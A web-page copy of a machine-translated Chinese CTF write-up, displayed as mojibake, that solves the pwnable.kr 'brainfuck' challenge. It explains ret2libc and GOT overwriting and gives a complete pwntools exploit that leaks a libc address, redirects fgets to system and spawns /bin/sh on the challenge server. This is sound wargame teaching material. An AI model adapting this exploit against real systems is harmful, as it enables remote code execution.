<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ğŸ›· ğŸ‘©â€â¤ï¸â€ğŸ‘¨ ğŸŒ» ä½¿ç”¨pwnable.kr 22è§£å†³é—®é¢˜-Brainfuckã€‚ Ret2libcæ”»å‡» ğŸŒŸ ğŸ‘µğŸ¼ ãŠ™ï¸</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬å°†ä»ç«™ç‚¹pwnable.krè§£å†³ç¬¬22ä¸ªä»»åŠ¡ï¼Œå¹¶æ‰¾å‡ºæ¶‰åŠå°†GOTä¸­çš„åœ°å€é‡å†™ä¸ºåº“ä¸­æ‰€éœ€åŠŸèƒ½åœ°å€çš„æ”»å‡»ç±»åˆ«ã€‚ 

 ç»„ç»‡ä¿¡æ¯ ç‰¹åˆ«æ˜¯å¯¹äºé‚£äº›æƒ³è¦å­¦ä¹ æ–°çŸ¥è¯†å¹¶åœ¨ä¿¡æ¯å’Œè®¡ç®—æœºå®‰å…¨æ€§çš„ä»»ä½•é¢†åŸŸä¸­å‘å±•çš„äººä»¬ï¼Œæˆ‘å°†æ’°å†™å’Œè®¨è®ºä»¥ä¸‹ç±»åˆ«ï¼š 



- PWNï¼› 
- å¯†ç å­¦ï¼ˆåŠ å¯†ï¼‰ï¼› 
- ç½‘ç»œæŠ€æœ¯ï¼ˆ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>ä½¿ç”¨pwnable.kr 22è§£å†³é—®é¢˜-Brainfuckã€‚ Ret2libcæ”»å‡»</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/466109/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/al/py/ef/alpyefagnx81cc2xc1ncjqs8lus.png" alt="å›¾ç‰‡"></div><br> åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬å°†ä»ç«™ç‚¹<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">pwnable.kr</a>è§£å†³ç¬¬22ä¸ªä»»åŠ¡ï¼Œå¹¶æ‰¾å‡ºæ¶‰åŠå°†GOTä¸­çš„åœ°å€é‡å†™ä¸ºåº“ä¸­æ‰€éœ€åŠŸèƒ½åœ°å€çš„æ”»å‡»ç±»åˆ«ã€‚ <br><br><div class="spoiler">  <b class="spoiler_title">ç»„ç»‡ä¿¡æ¯</b> <div class="spoiler_text">ç‰¹åˆ«æ˜¯å¯¹äºé‚£äº›æƒ³è¦å­¦ä¹ æ–°çŸ¥è¯†å¹¶åœ¨ä¿¡æ¯å’Œè®¡ç®—æœºå®‰å…¨æ€§çš„ä»»ä½•é¢†åŸŸä¸­å‘å±•çš„äººä»¬ï¼Œæˆ‘å°†æ’°å†™å’Œè®¨è®ºä»¥ä¸‹ç±»åˆ«ï¼š <br><br><ul><li>  PWNï¼› </li><li> å¯†ç å­¦ï¼ˆåŠ å¯†ï¼‰ï¼› </li><li> ç½‘ç»œæŠ€æœ¯ï¼ˆç½‘ç»œï¼‰ï¼› </li><li> åå‘ï¼ˆåå‘å·¥ç¨‹ï¼‰ï¼› </li><li> éšå†™æœ¯ï¼ˆSteganoï¼‰ï¼› </li><li> æœç´¢å’Œåˆ©ç”¨Webæ¼æ´ã€‚ </li></ul><br> é™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘è¿˜å°†åˆ†äº«æˆ‘åœ¨è®¡ç®—æœºå–è¯ï¼Œæ¶æ„è½¯ä»¶å’Œå›ºä»¶åˆ†æï¼Œå¯¹æ— çº¿ç½‘ç»œå’Œå±€åŸŸç½‘çš„æ”»å‡»ï¼Œè¿›è¡Œç¬”æµ‹è¯•å’Œç¼–å†™æ¼æ´åˆ©ç”¨ç¨‹åºæ–¹é¢çš„ç»éªŒã€‚ <br><a name="habracut"></a><br> ä¸ºäº†ä½¿æ‚¨å¯ä»¥æŸ¥æ‰¾æœ‰å…³æ–°æ–‡ç« ï¼Œè½¯ä»¶å’Œå…¶ä»–ä¿¡æ¯çš„ä¿¡æ¯ï¼Œæˆ‘<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">åœ¨Telegramä¸­</a>åˆ›å»ºäº†ä¸€ä¸ª<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">é¢‘é“ï¼Œ</a>å¹¶åˆ›å»ºäº†ä¸€ä¸ª<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">å°ç»„æ¥è®¨è®º</a> ICDé¢†åŸŸçš„<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">æ‰€æœ‰é—®é¢˜</a> ã€‚ å¦å¤–ï¼Œæˆ‘ä¼šäº²è‡ªè€ƒè™‘æ‚¨çš„ä¸ªäººè¦æ±‚ï¼Œé—®é¢˜ï¼Œå»ºè®®å’Œå»ºè®®ï¼Œ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">å¹¶ä¼šå›ç­”æ‰€æœ‰äºº</a> ã€‚ <br><cut></cut><br> æä¾›æ‰€æœ‰ä¿¡æ¯ä»…å‡ºäºæ•™è‚²ç›®çš„ã€‚ å¯¹äºç”±äºä½¿ç”¨æœ¬æ–‡æ¡£è€Œè·å¾—çš„çŸ¥è¯†å’Œæ–¹æ³•å¯¹æŸäººé€ æˆçš„ä»»ä½•æŸå®³ï¼Œæœ¬æ–‡æ¡£çš„ä½œè€…ä¸æ‰¿æ‹…ä»»ä½•è´£ä»»ã€‚ <br></div></div><br><h2> è¿”å›å›¾ä¹¦é¦†æ”»å‡» </h2><br> å½“å°†å †æ ˆä¸ŠæŸä¸ªå‡½æ•°çš„è¿”å›åœ°å€æ›¿æ¢ä¸ºç¨‹åºä¸­å¦ä¸€ä¸ªå‡½æ•°çš„åœ°å€ï¼Œå¹¶å°†è°ƒç”¨å‡½æ•°çš„å‚æ•°å†™å…¥å †æ ˆçš„ä¸‹ä¸€éƒ¨åˆ†æ—¶ï¼Œè¿”å›åº“æ”»å‡»ï¼ˆReturn-to-libcæ”»å‡»ï¼‰æ˜¯ä¸ç¼“å†²åŒºæº¢å‡ºç›¸å…³çš„è®¡ç®—æœºæ”»å‡»ç±»å‹ä¹‹ä¸€ã€‚ æ­¤æŠ€æœ¯ä½¿æ”»å‡»è€…æ— éœ€åœ¨ç¨‹åºä¸­æ³¨å…¥æ¶æ„ä»£ç å³å¯æ‰§è¡Œåº“ä¸­ä»»ä½•ç°æœ‰åŠŸèƒ½ã€‚ <br><br>  Linuxæœ‰ä¸€ä¸ªå…±äº«çš„libcåº“ï¼Œè¯¥åº“æä¾›Cå’ŒPOSIXæ ‡å‡†åŠŸèƒ½ï¼Œä¾‹å¦‚ç”¨äºæ‰§è¡Œä»»æ„å‘½ä»¤çš„systemï¼ˆï¼‰ã€‚  Windowsæ“ä½œç³»ç»Ÿå®¶æ—ä¸­ä¹Ÿå­˜åœ¨ç±»ä¼¼çš„åº“ã€‚ å°½ç®¡æ”»å‡»è€…å¯ä»¥è¿«ä½¿ç¨‹åºè·³è½¬åˆ°ä»»ä½•åœ°å€ï¼Œä½†æ˜¯å¤§å¤šæ•°ç¨‹åºéƒ½ä½¿ç”¨libcï¼ˆé“¾æ¥åˆ°å®ƒï¼‰ï¼Œä½†å®ƒå…·æœ‰å¯åŠ¨ä»»æ„å‘½ä»¤çš„ä¾¿æ·åŠŸèƒ½ã€‚ å› æ­¤ï¼Œæ ‡å‡†åº“çš„åŠŸèƒ½æ˜¯æ­¤ç±»æ¼æ´åˆ©ç”¨çš„æœ€å¯èƒ½ç›®æ ‡ï¼Œä»è€Œå°†æ”»å‡»ç±»åˆ«ç§°ä¸ºâ€œæ¼æ´åˆ©ç”¨â€ã€‚ <br><br><h2> è§£å†³é­‚å™¨ä»»åŠ¡ </h2><br> æˆ‘ä»¬å¼€å§‹ç¬¬äºŒéƒ¨åˆ†ã€‚ æˆ‘å°†ç«‹å³è¯´ï¼Œè¿™æ¯”ç¬¬ä¸€ç§å›°éš¾ï¼Œè€Œä¸”æˆ‘ä»¬æ²¡æœ‰æä¾›åº”ç”¨ç¨‹åºçš„æºä»£ç ã€‚ ä¸è¦å¿˜è®°<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">è¿™é‡Œ</a>çš„è®¨è®ºã€‚ è®©æˆ‘ä»¬å¼€å§‹å§ã€‚ <br><br> å•å‡»å¸¦æœ‰ç­¾åçš„å¤§è„‘ä»–å¦ˆçš„çš„å›¾æ ‡ã€‚ ä»–ä»¬ä¸ºæˆ‘ä»¬æä¾›äº†ç”¨äºè¿æ¥çš„åœ°å€å’Œç«¯å£ï¼Œç¨‹åºæœ¬èº«ï¼Œç”¨äºè¯¥ç¨‹åºçš„libcåº“ï¼Œå¹¶è§£é‡Šè¯´è¿™æ˜¯ä¸€ä¸ªè®©äºº<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">è®¨åŒçš„</a>è¯­è¨€æ¨¡æ‹Ÿå™¨ã€‚ <br><br><img src="https://habrastorage.org/webt/su/6-/cj/su6-cj84sqqcpxxnyhj5qqmxsgo.png" alt="å›¾ç‰‡"><br><br> ä¸‹è½½ä»–ä»¬ç»™æˆ‘ä»¬çš„æ‰€æœ‰å†…å®¹ï¼Œæ£€æŸ¥äºŒè¿›åˆ¶æ–‡ä»¶ã€‚ è¿™æ˜¯ä¸€ä¸ª32ä½çš„elfï¼Œå› æ­¤æˆ‘ä»¬åœ¨IDA Proä¸­åç¼–è¯‘è¯¥ç¨‹åºã€‚ <br><br><img src="https://habrastorage.org/webt/pi/h-/ly/pih-lyvpqmmcbmqowix9narmi2k.png" alt="å›¾ç‰‡"><br><br> ä¸»è¦åŠŸèƒ½æ²¡æœ‰æ¼æ´ã€‚ æ§åˆ¶å†…å­˜çš„åˆ†é…å’Œåœ¨å˜é‡sä¸­è¾“å…¥çš„å­—ç¬¦æ•°ã€‚ åœ¨æ­¤ä¹‹å‰ï¼Œå°†åˆå§‹åŒ–pæŒ‡é’ˆã€‚ è®©æˆ‘ä»¬çœ‹ä¸€ä¸‹BrainfuckåŠŸèƒ½ã€‚ <br><br><img src="https://habrastorage.org/webt/-3/7r/2n/-37r2nmfqh7f6spllpvhvpuhjdm.png" alt="å›¾ç‰‡"><br><br> æ­¤å‡½æ•°ç”¨äºè¾“å…¥çš„å­—ç¬¦ä¸²çš„æ¯ä¸ªå­—ç¬¦ã€‚ å®ƒåŒ…å«ä¸€ç³»åˆ—åŠ¨ä½œï¼Œå…·ä½“å–å†³äºè§’è‰²ã€‚ å®Œæ•´çš„å‘½ä»¤é›†å¦‚ä¸‹æ‰€ç¤ºï¼š <br><br><ul><li>  +ï¼šå°†på¤„çš„å€¼åŠ 1ï¼› </li><li>  ï¼Œ:ï¼šä»æ ‡å‡†è¾“å…¥ä¸­è·å–å¦ä¸€ä¸ªå­—ç¬¦ï¼Œå¹¶åœ¨på¤„è·å–ï¼› </li><li>  -ï¼šä»pçš„å€¼ä¸­å‡å»1ï¼› </li><li>  ã€‚ï¼šåœ¨åœ°å€på¤„æ˜¾ç¤ºå­—ç¬¦ï¼› </li><li>  &lt;ï¼šä»pä¸­å‡å»ï¼› </li><li>  &gt;ï¼šåŠ åˆ°pã€‚ </li></ul><br><img src="https://habrastorage.org/webt/ox/gd/nf/oxgdnfe2pk-zls3jr9qqdhn0dg0.png" alt="å›¾ç‰‡"><br><br> å› æ­¤ï¼Œå¯¹æˆ‘ä»¬ä»»åŠ¡çš„è§£å†³æ–¹æ¡ˆå°†é€šè¿‡æ“çºµæŒ‡é’ˆpæ¥å®ç°ã€‚ æŸ¥æ‰¾å…¶èµ·å§‹åœ°å€ã€‚ åœ¨ä¸»è¦åŠŸèƒ½ä¸­ï¼Œå¯å˜ç£å¸¦çš„åœ°å€è¾“å…¥pï¼Œå³0x804a0a0ã€‚ <br><br><img src="https://habrastorage.org/webt/k7/i7/if/k7i7ifj52qqf8mld4mdj1i8zsxi.png" alt="å›¾ç‰‡"><br><br> åŒæ—¶ï¼Œgot.pltèŠ‚ä½äº0x804a000ï¼Œæ‰€ä½¿ç”¨å‡½æ•°çš„åœ°å€å­˜å‚¨åœ¨libcåº“ä¸­ã€‚ å…³äºGOTå’ŒPLTï¼Œæˆ‘å·²ç»åœ¨<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">è¿™é‡Œ</a>å†™è¿‡ã€‚ <br><br><img src="https://habrastorage.org/webt/-g/b0/lu/-gb0lu2iivnqmm20unlbzjjp2ky.png" alt="å›¾ç‰‡"><br><br> ç”±äºå¯ä»¥é€šè¿‡æ“çºµæŒ‡é’ˆpæ¥åˆ°è¾¾GOTï¼Œå› æ­¤å¯ä»¥å®æ–½åƒret2libcè¿™æ ·çš„æ”»å‡»ã€‚ ä¸ºæ­¤ï¼Œæˆ‘ä»¬å°†éœ€è¦ä»libcä¸­é‡å†™ç”¨äºç³»ç»Ÿåœ°å€çš„å‡½æ•°çš„åœ°å€ï¼ˆç”šè‡³ä¸ºæˆ‘ä»¬æä¾›ä¸€ä¸ªåº“ï¼‰ã€‚ <br><br> å› æ­¤ï¼Œå‡ºç°äº†ä»¥ä¸‹æ”»å‡»åª’ä»‹ï¼š <br><br><ol><li> å°†åœ°å€fgetsé‡å†™ä¸ºç³»ç»ŸåŠŸèƒ½çš„åœ°å€ï¼› </li><li> é‡å†™memsetåœ°å€ä»¥è·å–ï¼› </li><li> å°†putcharåœ°å€é‡å†™ä¸ºmainã€‚ </li></ol><br> ç»“æœæ˜¯ï¼šå®Œæˆä¸Šè¿°æ­¥éª¤åï¼Œè°ƒç”¨putcharå‡½æ•°æ—¶ï¼Œå°†è°ƒç”¨mainå‡½æ•°ï¼Œè¯¥å‡½æ•°å°†è°ƒç”¨getè€Œä¸æ˜¯memsetå¹¶è¯»å–æˆ‘ä»¬è¾“å…¥åˆ°å †æ ˆä¸­çš„å­—ç¬¦ä¸²ã€‚ ä¹‹åï¼Œå°†è°ƒç”¨ä¸€ä¸ªç³»ç»Ÿï¼Œè€Œä¸æ˜¯fgetsï¼Œå®ƒå°†ä»å †æ ˆä¸­å¼•å‘ä¸€ä¸ªå‚æ•°ï¼ˆå³æˆ‘ä»¬è¾“å…¥çš„è¡Œï¼‰ã€‚ <br><cut></cut><br> è®©æˆ‘ä»¬å®ç°å®ƒã€‚ é¦–å…ˆï¼Œåˆ›å»ºä¸€ä¸ªåŒ…å«æŒ‡é’ˆå’Œå‡½æ•°åœ°å€çš„æ¨¡æ¿ï¼š <br><br><pre><code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">from</span></span> pwn <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * r = remote(<span class="hljs-string"><span class="hljs-string">'pwnable.kr'</span></span>, <span class="hljs-number"><span class="hljs-number">9001</span></span>) p = <span class="hljs-number"><span class="hljs-number">0x804a0a0</span></span> p_fgets = <span class="hljs-number"><span class="hljs-number">0x804a010</span></span> p_puts = <span class="hljs-number"><span class="hljs-number">0x804a018</span></span> p_putchar = <span class="hljs-number"><span class="hljs-number">0x804a030</span></span> p_main = <span class="hljs-number"><span class="hljs-number">0x8048671</span></span></code> </pre> <br> ç°åœ¨ï¼Œæˆ‘ä»¬å°†ç¼–å†™ä¸€ä¸ªå‡½æ•°ï¼Œå°†æŒ‡é’ˆç§»è‡³æ‰€éœ€çš„æ­¥éª¤æ•°ï¼š <br><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">mvAddr</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(n)</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-keyword"><span class="hljs-keyword">global</span></span> pp += n <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> n &gt; <span class="hljs-number"><span class="hljs-number">0</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-string"><span class="hljs-string">"&gt;"</span></span>*n <span class="hljs-keyword"><span class="hljs-keyword">else</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-string"><span class="hljs-string">"&lt;"</span></span>*((<span class="hljs-number"><span class="hljs-number">-1</span></span>)*n)</code> </pre> <br> è¯»å–4ä¸ªå­—èŠ‚çš„å‡½æ•°ï¼š <br><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">readVar</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-string"><span class="hljs-string">".&gt;"</span></span>*<span class="hljs-number"><span class="hljs-number">4</span></span> + <span class="hljs-string"><span class="hljs-string">"&lt;"</span></span>*<span class="hljs-number"><span class="hljs-number">4</span></span></code> </pre> <br> è¯¥å‡½æ•°å°†æ¥å—å¹¶å†™å…¥4ä¸ªå­—èŠ‚ï¼š <br><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">writeVar</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-string"><span class="hljs-string">",&gt;"</span></span>*<span class="hljs-number"><span class="hljs-number">4</span></span> + <span class="hljs-string"><span class="hljs-string">"&lt;"</span></span>*<span class="hljs-number"><span class="hljs-number">4</span></span></code> </pre> <br> ç°åœ¨æˆ‘ä»¬å°†å†™å…¥è´Ÿè½½ï¼Œè¿™å¾ˆç®€å•-æˆ‘ä»¬ç§»è‡³fgetsåœ°å€ï¼Œè¿›è¡Œè¯»å–ï¼ˆç¨åæˆ‘ä¼šè¯´ä¸ºä»€ä¹ˆï¼‰ï¼Œç„¶åé‡å†™...æˆ‘ä»¬ç§»è‡³å†…å­˜é›†åœ°å€-æˆ‘ä»¬è¿›è¡Œé‡å†™ï¼Œæˆ‘ä»¬ç§»è‡³putcharåœ°å€-æˆ‘ä»¬è¿›è¡Œé‡å†™ã€‚ ä¸€åˆ‡éƒ½åœ¨æƒ³æ³•ä¸­ã€‚ <br><br><pre> <code class="python hljs">payload = mvAddr(p_fgets - p) payload += readVar() payload += writeVar() payload += mvAddr(p_memset - p) payload += writeVar() payload += mvAddr(p_putchar - p) payload += writeVar() payload += <span class="hljs-string"><span class="hljs-string">'.'</span></span></code> </pre> <br> é‚£ä¹ˆä¸ºä»€ä¹ˆè¦è¯»å–fgetsçš„åœ°å€å‘¢ï¼Ÿ ç”±äºæ˜¯get.pltï¼Œå› æ­¤æˆ‘ä»¬å°†fgetsçš„åœ°å€è¯»å–åˆ°å…³è”çš„libcåº“ã€‚ å› ä¸ºæˆ‘ä»¬åªæœ‰ä¸€ä¸ªlibcåº“ï¼ˆæœªé“¾æ¥ï¼‰ï¼Œæ‰€ä»¥ä»é“¾æ¥åº“ä¸­çš„å‡½æ•°åœ°å€ä¸­å‡å»æœªé“¾æ¥åº“ä¸­ç›¸åŒå‡½æ•°çš„åœ°å€-æˆ‘ä»¬å°†ç¡®å®šåŸºæ•°ï¼Œå³ç”±mæ–‡ä»¶é“¾æ¥è¯¥åº“çš„åœ°å€ï¼ˆåº“ä»£ç çš„å¼€å¤´ï¼‰ã€‚ ç„¶ååœ¨ä¸ç›¸å…³çš„åº“ä¸­å°†ä»»ä½•å‡½æ•°çš„åç§»é‡æ·»åŠ åˆ°åŸºæ•°ä¸­ï¼Œæˆ‘ä»¬å°†åœ¨å·²è¿æ¥çš„åº“ä¸­è·å¾—è¯¥å‡½æ•°çš„åœ°å€ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å°†ä»ç”šè‡³æ²¡æœ‰å®šä¹‰çš„äºŒè¿›åˆ¶æ–‡ä»¶ä¸­è°ƒç”¨ä¸€ä¸ªå‡½æ•°ã€‚ <br><br> å› æ­¤ï¼Œæ­¤è´Ÿè½½å°†ä¸ºæˆ‘ä»¬æä¾›é“¾æ¥åº“ä¸­å‡½æ•°çš„åœ°å€ã€‚ è®©æˆ‘ä»¬åœ¨ä¸ç›¸å…³çš„åœ°æ–¹æ‰¾åˆ°å¥¹çš„åœ°å€ã€‚ <br><br><pre> <code class="python hljs">libc = ELF(<span class="hljs-string"><span class="hljs-string">'./bf_libc.so'</span></span>) fgets_addr_libc = libc.symbols[<span class="hljs-string"><span class="hljs-string">'fgets'</span></span>]</code> </pre> <br> ç°åœ¨ï¼Œæ ¹æ®æœåŠ¡å™¨çš„å“åº”ï¼Œæˆ‘ä»¬å°†æ‰¾åˆ°æ•°æ®åº“ã€‚ <br><br><pre> <code class="python hljs">r.recvline() r.recvline() r.send(payload+<span class="hljs-string"><span class="hljs-string">'\n'</span></span>) fgets_addr_bin = u32(r.recv() + r.recv()) libc_base = int( fgets_addr_bin - fgets_addr_libc)</code> </pre> <br> ç°åœ¨ï¼Œæˆ‘ä»¬è·å¾—äº†è€ƒè™‘åŸºæ•°çš„å…¶ä»–å‡½æ•°çš„åœ°å€ã€‚ <br><br><pre> <code class="python hljs">system = libc_base + libc.symbols[<span class="hljs-string"><span class="hljs-string">'system'</span></span>] gets = libc_base + libc.symbols[<span class="hljs-string"><span class="hljs-string">'gets'</span></span>]</code> </pre> <br> å¹¶ä¸”æˆ‘ä»¬å®ç°äº†æˆ‘ä»¬çš„æƒ³æ³•ã€‚ <br><br><pre> <code class="python hljs">r.send(p32(system)) r.send(p32(gets)) r.send(p32(p_main)) r.send(<span class="hljs-string"><span class="hljs-string">"/bin/sh"</span></span> + <span class="hljs-string"><span class="hljs-string">'\n'</span></span>) r.interactive()</code> </pre> <br><div class="spoiler">  <b class="spoiler_title">å®Œæ•´ä»£ç </b> <div class="spoiler_text"><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">from</span></span> pwn <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * r = remote(<span class="hljs-string"><span class="hljs-string">'pwnable.kr'</span></span>, <span class="hljs-number"><span class="hljs-number">9001</span></span>) p = <span class="hljs-number"><span class="hljs-number">0x804a0a0</span></span> p_fgets = <span class="hljs-number"><span class="hljs-number">0x804a010</span></span> p_memset = <span class="hljs-number"><span class="hljs-number">0x804a02c</span></span> p_putchar = <span class="hljs-number"><span class="hljs-number">0x804a030</span></span> p_main = <span class="hljs-number"><span class="hljs-number">0x8048671</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">mvAddr</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(n)</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-keyword"><span class="hljs-keyword">global</span></span> pp += n <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> n &gt; <span class="hljs-number"><span class="hljs-number">0</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-string"><span class="hljs-string">"&gt;"</span></span>*n <span class="hljs-keyword"><span class="hljs-keyword">else</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-string"><span class="hljs-string">"&lt;"</span></span>*((<span class="hljs-number"><span class="hljs-number">-1</span></span>)*n) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">readVar</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-string"><span class="hljs-string">".&gt;"</span></span>*<span class="hljs-number"><span class="hljs-number">4</span></span> + <span class="hljs-string"><span class="hljs-string">"&lt;"</span></span>*<span class="hljs-number"><span class="hljs-number">4</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">writeVar</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-string"><span class="hljs-string">",&gt;"</span></span>*<span class="hljs-number"><span class="hljs-number">4</span></span> + <span class="hljs-string"><span class="hljs-string">"&lt;"</span></span>*<span class="hljs-number"><span class="hljs-number">4</span></span> payload = mvAddr(p_fgets - p) payload += readVar() payload += writeVar() payload += mvAddr(p_memset - p) payload += writeVar() payload += mvAddr(p_putchar - p) payload += writeVar() payload += <span class="hljs-string"><span class="hljs-string">'.'</span></span> libc = ELF(<span class="hljs-string"><span class="hljs-string">'./bf_libc.so'</span></span>) fgets_addr_libc = libc.symbols[<span class="hljs-string"><span class="hljs-string">'fgets'</span></span>] r.recvline() r.recvline() r.send(payload+<span class="hljs-string"><span class="hljs-string">'\n'</span></span>) fgets_addr_bin = u32(r.recv() + r.recv()) libc_base = int( fgets_addr_bin - fgets_addr_libc) system = libc_base + libc.symbols[<span class="hljs-string"><span class="hljs-string">'system'</span></span>] gets = libc_base + libc.symbols[<span class="hljs-string"><span class="hljs-string">'gets'</span></span>] r.send(p32(system)) r.send(p32(gets)) r.send(p32(p_main)) r.send(<span class="hljs-string"><span class="hljs-string">"/bin/sh"</span></span> + <span class="hljs-string"><span class="hljs-string">'\n'</span></span>) r.interactive()</code> </pre> <br></div></div><br><img src="https://habrastorage.org/webt/py/bq/is/pybqis-occir7zwn2r_87ubpbcm.png" alt="å›¾ç‰‡"><br><br> æˆ‘ä»¬å¾—åˆ°æ‰€éœ€çš„æ ‡å¿—ï¼Œå¹¶åœ¨pwnable.krä¸Šå¯åŠ¨ä»»åŠ¡çš„ç¬¬äºŒéƒ¨åˆ†ã€‚ <br><br><img src="https://habrastorage.org/webt/g0/jq/oi/g0jqoip-bdvvmskww2yuiq6qfoy.png" alt="å›¾ç‰‡"><br><br> æ‚¨å¯ä»¥é€šè¿‡<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Telegram</a>åŠ å…¥æˆ‘ä»¬ã€‚ ä¸‹æ¬¡æˆ‘ä»¬å°†å¤„ç†å †æº¢å‡ºã€‚ </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/zh-CN466109/">https://habr.com/ru/post/zh-CN466109/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../zh-CN466097/index.html">ç›‘è§†.NETåº”ç”¨ç¨‹åº</a></li>
